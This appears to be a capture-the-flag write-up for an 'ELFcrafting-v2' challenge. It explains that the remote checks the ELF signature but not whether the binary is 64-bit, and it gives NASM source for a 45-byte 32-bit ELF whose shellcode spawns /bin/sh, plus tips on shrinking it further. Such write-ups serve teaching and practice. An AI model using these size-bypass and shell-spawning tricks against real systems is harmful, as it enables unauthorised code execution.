## Intended
This challenge uses the same setup as ELFcrafting-v1, except it only allows a maximum of 79 bytes instead of 32. The smallest possible 64 bit binary is 80 bytes, and it should be impossible to go lower unless `binfmt.c` changes and becomes more permissive. This time the remote actually verifies the ELF signature, so no more shebangs. However the remote does not verify that the binary is actually a 64 bit binary. 32 bit binaries can be as small as 45 bytes, and gives up ample room for our own shellcode to pop a shell.

### Solution
**taken from [https://www.muppetlabs.com/~breadbox/software/tiny/teensy.html](https://www.muppetlabs.com/~breadbox/software/tiny/teensy.html)**

```x86asm noheader
		BITS 32
  
		org	0x00010000
  
		db	0x7F, "ELF"
		dd	1
		dd	0
		dd	$$
		dw	2
		dw	3
		dd	_start
		dd	_start
		dd	4
_start:	mov	al,	11
        jmp	next
		nop
		nop
		nop
		db	0
		dw	0x34
		dw	0x20
		dd	1
next:	mov	ebx,	bin_sh
        int	0x80
bin_sh:	db	"/bin/sh", 0
  
filesize	equ	$ - $$
```

### sidenote:
You could golf this down further by replacing the `_start` code with `/bin/sh\x00` and relocating `_start`.

### sidenote:
Some people had problems with their solutions because they attempted to load their programs at an address lower than ubuntu's default vm.mmap_min_addr of `0x10000` which caused their programs to crash.
